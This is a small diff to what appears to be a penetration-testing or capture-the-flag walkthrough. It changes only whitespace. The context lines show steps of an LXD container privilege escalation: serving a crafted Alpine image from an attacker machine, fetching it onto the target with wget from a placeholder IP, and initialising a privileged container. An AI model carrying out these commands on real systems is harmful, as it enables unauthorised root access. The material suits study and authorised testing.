@@ -65,7 +65,7 @@ sudo python3 -m http.server 80
 
 > On target machine  
 cd /tmp  
-wget http://YOUR_IP/CREATED_ALPINE_FILE
+wget http://YOUR_IP/CREATED_ALPINE_FILE  
 lxc image import ./CREATED_ALPINE_FILE --alias myimage  
 lxc image list  
 lxc init myimage ignite -c security.privileged=true  
